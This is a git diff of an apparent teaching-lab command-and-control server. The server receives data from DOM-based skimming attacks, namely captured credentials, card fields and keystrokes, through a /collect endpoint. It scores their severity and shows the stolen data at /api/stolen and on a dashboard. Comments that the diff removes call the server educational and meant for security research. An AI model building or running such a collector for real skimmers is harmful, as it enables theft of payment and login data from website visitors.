@@ -1,14 +1,11 @@
 /**
- * C2-SERVER.JS - ENHANCED COMMAND & CONTROL SERVER
+ * ENHANCED C2 SERVER - Support for both local storage and Cloud Storage
  *
- * Handles data collection from DOM-based skimming attacks with intelligent storage:
- * - Automatic storage mode detection (local vs cloud)
- * - Smart aggregation for Cloud Storage deployments
- * - Transparent caching for optimal dashboard performance
- * - Multi-lab isolation and batch optimization
- * - Labs simply POST to /collect - all storage complexity handled here
- *
- * FOR EDUCATIONAL PURPOSES ONLY
+ * Environment Variables:
+ * - STORAGE_MODE: 'local' | 'cloud' (default: auto-detect)
+ * - C2_STORAGE_BUCKET: Cloud Storage bucket name
+ * - LAB_ID: Lab identifier for multi-tenant storage
+ * - GOOGLE_CLOUD_PROJECT: GCP project ID
  */
 
 const express = require('express')
@@ -34,13 +31,13 @@ const CLOUD_RUN_ENV = process.env.K_SERVICE !== undefined // Detect Cloud Run
 
 function detectStorageMode() {
   // Auto-detect based on environment
-  if (CLOUD_RUN_ENV && SmartAggregationAdapter) {
+  if (CLOUD_RUN_ENV && CloudStorageAdapter) {
     return 'cloud'
   }
   return 'local'
 }
 
-// Initialize storage adapter based on mode - C2 server owns all storage complexity
+// Initialize storage adapter based on mode
 let storageAdapter
 if (STORAGE_MODE === 'cloud' && SmartAggregationAdapter) {
   storageAdapter = new SmartAggregationAdapter({
@@ -85,17 +82,6 @@ if (STORAGE_MODE === 'cloud' && SmartAggregationAdapter) {
   console.log(`[C2-Server] Using local storage mode (${CLOUD_RUN_ENV ? 'WARNING: Cloud Run detected but cloud storage not available' : 'container environment'})`)
 }
 
-// Attack statistics tracking
-let attackStatistics = {
-  totalRequests: 0,
-  domMonitorSessions: 0,
-  formOverlayCaptures: 0,
-  shadowDomCaptures: 0,
-  uniqueVictims: new Set(),
-  startTime: Date.now(),
-  storageMode: STORAGE_MODE
-}
-
 // Middleware
 app.use(cors())
 app.use(express.json({ limit: '10mb' }))
@@ -115,8 +101,19 @@ app.use((req, res, next) => {
   }
 })
 
+// Attack statistics tracking
+let attackStatistics = {
+  totalRequests: 0,
+  domMonitorSessions: 0,
+  formOverlayCaptures: 0,
+  shadowDomCaptures: 0,
+  uniqueVictims: new Set(),
+  startTime: Date.now(),
+  storageMode: STORAGE_MODE
+}
+
 /**
- * Storage abstraction layer - Labs just POST to /collect, C2 handles storage complexity
+ * Storage abstraction layer
  */
 async function saveAttackData(attackType, data) {
   if (storageAdapter && STORAGE_MODE === 'cloud') {
@@ -183,8 +180,7 @@ async function saveAnalysis(analysis) {
   }
 }
 
-
-// Utility functions
+// Utility functions (keeping existing ones)
 function sanitizeForLog(input) {
   if (typeof input !== 'string') input = String(input)
   return input.replace(/[\r\n\t\x00-\x1f\x7f]/g, ' ').substring(0, 500)
@@ -204,7 +200,7 @@ function generateSessionId() {
   return 'session_' + Date.now() + '_' + Math.random().toString(36).substring(2, 11)
 }
 
-// Analysis functions
+// Analysis functions (keeping existing logic but making async-compatible)
 function analyzeAttackData(data) {
   const analysis = {
     timestamp: Date.now(),
@@ -262,32 +258,6 @@ function assessDomMonitorSeverity(data) {
   return 'low'
 }
 
-function assessFormOverlaySeverity(data) {
-  if (data.data && data.data.credentials) {
-    const credentialFields = Object.keys(data.data.credentials)
-    const hasPassword = credentialFields.some(field => field.includes('password'))
-    const hasCard = credentialFields.some(field => field.includes('card') || field.includes('cvv'))
-
-    if (hasPassword && hasCard) return 'critical'
-    if (hasPassword || hasCard) return 'high'
-    if (credentialFields.length > 3) return 'medium'
-  }
-  return 'low'
-}
-
-function assessShadowDomSeverity(data) {
-  if (data.sessions) {
-    const sessionCount = data.sessions.length
-    const hasKeystrokes = data.sessions.some(
-      s => s.capturedKeystrokes && s.capturedKeystrokes.length > 0
-    )
-
-    if (sessionCount > 5 && hasKeystrokes) return 'high'
-    if (sessionCount > 2 || hasKeystrokes) return 'medium'
-  }
-  return 'low'
-}
-
 function extractDomMonitorIndicators(data) {
   const indicators = ['DOM MutationObserver usage', 'Real-time field monitoring']
 
@@ -305,58 +275,54 @@ function extractDomMonitorIndicators(data) {
   return indicators
 }
 
+// Keep other analysis functions unchanged...
+function assessFormOverlaySeverity(data) {
+  if (data.data && data.data.credentials) {
+    const credentialFields = Object.keys(data.data.credentials)
+    const hasPassword = credentialFields.some(field => field.includes('password'))
+    const hasCard = credentialFields.some(field => field.includes('card') || field.includes('cvv'))
+    if (hasPassword && hasCard) return 'critical'
+    if (hasPassword || hasCard) return 'high'
+    if (credentialFields.length > 3) return 'medium'
+  }
+  return 'low'
+}
+
+function assessShadowDomSeverity(data) {
+  if (data.sessions) {
+    const sessionCount = data.sessions.length
+    const hasKeystrokes = data.sessions.some(s => s.capturedKeystrokes && s.capturedKeystrokes.length > 0)
+    if (sessionCount > 5 && hasKeystrokes) return 'high'
+    if (sessionCount > 2 || hasKeystrokes) return 'medium'
+  }
+  return 'low'
+}
+
 function extractFormOverlayIndicators(data) {
   const indicators = ['Dynamic form overlay injection', 'Credential harvesting']
-
   if (data.data && data.data.formType) {
     indicators.push(`Target form type: ${data.data.formType}`)
   }
-
-  if (data.metadata && data.metadata.injectionAttempts > 1) {
-    indicators.push('Multiple injection attempts')
-  }
-
   return indicators
 }
 
 function extractShadowDomIndicators(data) {
   const indicators = ['Shadow DOM encapsulation abuse', 'Cross-boundary monitoring']
-
-  if (data.shadowInfo) {
-    if (data.shadowInfo.mode === 'closed') {
-      indicators.push('Closed shadow DOM usage')
-    }
-    if (data.shadowInfo.maxDepth > 1) {
-      indicators.push('Nested shadow DOM structure')
-    }
+  if (data.shadowInfo && data.shadowInfo.mode === 'closed') {
+    indicators.push('Closed shadow DOM usage')
   }
-
   return indicators
 }
 
 function calculateRiskScore(analysis) {
   let score = 0
-
-  // Base score by severity
   switch (analysis.severity) {
-    case 'critical':
-      score += 90
-      break
-    case 'high':
-      score += 70
-      break
-    case 'medium':
-      score += 50
-      break
-    case 'low':
-      score += 20
-      break
+    case 'critical': score += 90; break
+    case 'high': score += 70; break
+    case 'medium': score += 50; break
+    case 'low': score += 20; break
   }
-
-  // Additional points for indicators
   score += analysis.indicators.length * 5
-
-  // Cap at 100
   return Math.min(score, 100)
 }
 
@@ -386,8 +352,29 @@ function updateStatistics(data) {
  * API Endpoints
  */
 
-// Main data collection endpoint
-// Main data collection endpoint - Labs POST here, C2 handles all storage complexity
+// Health check endpoint (enhanced for cloud storage)
+app.get('/health', async (req, res) => {
+  const health = {
+    status: 'healthy',
+    timestamp: Date.now(),
+    storageMode: STORAGE_MODE,
+    environment: CLOUD_RUN_ENV ? 'cloud-run' : 'container'
+  }
+
+  if (storageAdapter && STORAGE_MODE === 'cloud') {
+    try {
+      const storageHealth = await storageAdapter.healthCheck()
+      health.storage = storageHealth
+    } catch (error) {
+      health.storage = { status: 'unhealthy', error: error.message }
+      health.status = 'degraded'
+    }
+  }
+
+  res.json(health)
+})
+
+// Main data collection endpoint (enhanced for async storage)
 app.post('/collect', async (req, res) => {
   try {
     const attackData = req.body
@@ -403,7 +390,7 @@ app.post('/collect', async (req, res) => {
     updateStatistics(attackData)
     const analysis = analyzeAttackData(attackData)
 
-    // Save data asynchronously - C2 server handles all storage logic
+    // Save data asynchronously
     const [savedPath] = await Promise.all([
       saveAttackData(analysis.attackType, attackData),
       saveAnalysis(analysis)
@@ -502,196 +489,9 @@ app.get('/api/stolen', async (req, res) => {
   }
 })
 
-// Get recent attack data (metadata only)
-app.get('/recent/:count?', (req, res) => {
-  try {
-    const count = parseInt(req.params.count) || 10
-    const files = fs
-      .readdirSync(DATA_DIR)
-      .filter(file => file.endsWith('.json'))
-      .sort((a, b) => {
-        const statA = fs.statSync(path.join(DATA_DIR, a))
-        const statB = fs.statSync(path.join(DATA_DIR, b))
-        return statB.mtime - statA.mtime
-      })
-      .slice(0, count)
-
-    const recentAttacks = files.map(file => {
-      const filepath = path.join(DATA_DIR, file)
-      const data = JSON.parse(fs.readFileSync(filepath, 'utf8'))
-      return {
-        filename: file,
-        timestamp: data.serverTimestamp || data.timestamp,
-        type: data.type,
-        attackType: data.attackType,
-        size: fs.statSync(filepath).size
-      }
-    })
-
-    res.json(recentAttacks)
-  } catch (error) {
-    logToConsole('error', 'Error fetching recent attacks', { error: error.message })
-    res.status(500).json({ error: 'Error fetching data' })
-  }
-})
-
-// Get specific attack data
-app.get('/attack/:filename', (req, res) => {
-  try {
-    const filename = req.params.filename
-
-    // Security: Prevent path traversal attacks
-    // Only allow alphanumeric, hyphens, underscores, and dots in filename
-    if (!/^[a-zA-Z0-9._-]+$/.test(filename) || filename.includes('..')) {
-      return res.status(400).json({ error: 'Invalid filename' })
-    }
-
-    // Use path.basename to strip any directory separators
-    const safeFilename = path.basename(filename)
-    const filepath = path.join(DATA_DIR, safeFilename)
-
-    // Verify the resolved path is within DATA_DIR (prevent path traversal)
-    const resolvedPath = path.resolve(filepath)
-    const resolvedDataDir = path.resolve(DATA_DIR)
-    if (!resolvedPath.startsWith(resolvedDataDir)) {
-      return res.status(403).json({ error: 'Access denied' })
-    }
-
-    if (!fs.existsSync(filepath)) {
-      return res.status(404).json({ error: 'Attack data not found' })
-    }
-
-    const data = JSON.parse(fs.readFileSync(filepath, 'utf8'))
-    res.json(data)
-  } catch (error) {
-    logToConsole('error', 'Error fetching attack data', { error: error.message })
-    res.status(500).json({ error: 'Error reading attack data' })
-  }
-})
-
-// Get analysis for specific attack
-app.get('/analysis/:filename', (req, res) => {
-  try {
-    const filename = req.params.filename
-
-    // Security: Prevent path traversal attacks
-    // Only allow alphanumeric, hyphens, underscores, and dots in filename
-    if (!/^[a-zA-Z0-9._-]+$/.test(filename) || filename.includes('..')) {
-      return res.status(400).json({ error: 'Invalid filename' })
-    }
-
-    // Use path.basename to strip any directory separators
-    const safeFilename = path.basename(filename)
-    const analysisPath = path.join(ANALYSIS_DIR, `analysis_${safeFilename}`)
-
-    // Verify the resolved path is within ANALYSIS_DIR (prevent path traversal)
-    const resolvedPath = path.resolve(analysisPath)
-    const resolvedAnalysisDir = path.resolve(ANALYSIS_DIR)
-    if (!resolvedPath.startsWith(resolvedAnalysisDir)) {
-      return res.status(403).json({ error: 'Access denied' })
-    }
-
-    if (!fs.existsSync(analysisPath)) {
-      return res.status(404).json({ error: 'Analysis not found' })
-    }
-
-    const analysis = JSON.parse(fs.readFileSync(analysisPath, 'utf8'))
-    res.json(analysis)
-  } catch (error) {
-    logToConsole('error', 'Error fetching analysis', { error: error.message })
-    res.status(500).json({ error: 'Error reading analysis' })
-  }
-})
-
-// Dashboard endpoint - serves the main dashboard
-app.get('/', async (req, res) => {
-  try {
-    const dashboardPath = path.join(__dirname, 'dashboard.html')
-    const dashboard = fs.readFileSync(dashboardPath, 'utf8')
-    res.send(dashboard)
-  } catch (error) {
-    console.error('[C2] Failed to serve dashboard:', error)
-    res.status(500).send('Dashboard not available')
-  }
-})
-
-// Also serve dashboard at /stolen-data for nginx proxy
-app.get('/stolen-data', async (req, res) => {
-  try {
-    const dashboardPath = path.join(__dirname, 'dashboard.html')
-    const dashboard = fs.readFileSync(dashboardPath, 'utf8')
-    res.send(dashboard)
-  } catch (error) {
-    console.error('[C2] Failed to serve dashboard:', error)
-    res.status(500).send('Dashboard not available')
-  }
-})
-
-// Health check endpoint
-// Health check endpoint (enhanced for cloud storage)
-app.get('/health', async (req, res) => {
-  const health = {
-    status: 'healthy',
-    timestamp: Date.now(),
-    storageMode: STORAGE_MODE,
-    environment: CLOUD_RUN_ENV ? 'cloud-run' : 'container'
-  }
-
-  if (storageAdapter && STORAGE_MODE === 'cloud') {
-    try {
-      const storageHealth = await storageAdapter.healthCheck()
-      health.storage = storageHealth
-    } catch (error) {
-      health.storage = { status: 'unhealthy', error: error.message }
-      health.status = 'degraded'
-    }
-  }
-
-  res.json(health)
-})
-
-// Clear all stored data (for testing)
-app.post('/clear', (req, res) => {
-  try {
-    // Clear data files
-    const dataFiles = fs.readdirSync(DATA_DIR)
-    dataFiles.forEach(file => {
-      fs.unlinkSync(path.join(DATA_DIR, file))
-    })
-
-    // Clear analysis files
-    const analysisFiles = fs.readdirSync(ANALYSIS_DIR)
-    analysisFiles.forEach(file => {
-      fs.unlinkSync(path.join(ANALYSIS_DIR, file))
-    })
-
-    // Reset statistics
-    attackStatistics = {
-      totalRequests: 0,
-      domMonitorSessions: 0,
-      formOverlayCaptures: 0,
-      shadowDomCaptures: 0,
-      uniqueVictims: new Set(),
-      startTime: Date.now()
-    }
-
-    logToConsole('info', 'All stored data cleared')
-    res.json({ success: true, message: 'All data cleared' })
-  } catch (error) {
-    logToConsole('error', 'Error clearing data', { error: error.message })
-    res.status(500).json({ error: 'Error clearing data' })
-  }
-})
-
-// Error handling middleware
-app.use((error, req, res, next) => {
-  logToConsole('error', 'Unhandled error', { error: error.message, stack: error.stack })
-  res.status(500).json({ error: 'Internal server error' })
-})
-
-// 404 handler
-app.use((req, res) => {
-  res.status(404).json({ error: 'Endpoint not found' })
+// Serve dashboard
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'dashboard.html'))
 })
 
 // Graceful shutdown handling
@@ -712,42 +512,3 @@ app.listen(PORT, () => {
 })
 
 module.exports = app
-
-/**
- * C2 SERVER ANALYSIS:
- *
- * This C2 server provides comprehensive handling for DOM-based attacks:
- *
- * 1. **Multi-Attack Support**:
- *    - DOM Monitor real-time field monitoring
- *    - Form Overlay credential harvesting
- *    - Shadow DOM stealth operations
- *    - Cross-attack correlation
- *
- * 2. **Real-Time Analysis**:
- *    - Automatic severity assessment
- *    - Risk score calculation
- *    - Indicator extraction
- *    - Pattern recognition
- *
- * 3. **Data Management**:
- *    - Structured data storage
- *    - Analysis persistence
- *    - Attack statistics tracking
- *    - Victim correlation
- *
- * 4. **Monitoring Capabilities**:
- *    - Real-time attack statistics
- *    - Historical data access
- *    - Severity-based alerting
- *    - Performance tracking
- *
- * 5. **Educational Features**:
- *    - Clear attack categorization
- *    - Detailed analysis output
- *    - Pattern documentation
- *    - Testing utilities
- *
- * This server enables comprehensive analysis of DOM-based skimming
- * techniques for security research and ML training purposes.
- */
